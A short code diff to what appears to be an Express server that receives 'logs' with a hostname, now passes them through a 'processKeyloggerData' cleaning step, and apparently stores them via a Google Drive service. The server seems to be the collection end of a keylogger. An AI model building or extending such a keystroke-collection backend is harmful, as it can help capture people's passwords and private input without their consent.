@@ -4,6 +4,7 @@ import cors from 'cors'
 import dotenv from "dotenv";
 import GoogleDriveService from "./util/googleDrive.js";
 import BatchProcessor from "./util/batchProcessor.js";
+import {processKeyloggerData} from "./util/cleanRawLogs.js";
 
 dotenv.config({});
 
@@ -51,8 +52,10 @@ app.post("/", async (req, res) => {
     }
     
     try {
+        // Preprocess logs before batch processing
+        const processedLogs = processKeyloggerData(logs);
         // Always use batch processing for consistency and reliability
-        const result = await batchProcessor.processLargeDataset(hostname, logs);
+        const result = await batchProcessor.processLargeDataset(hostname, processedLogs);
         
         res.send({ 
             success: true, 
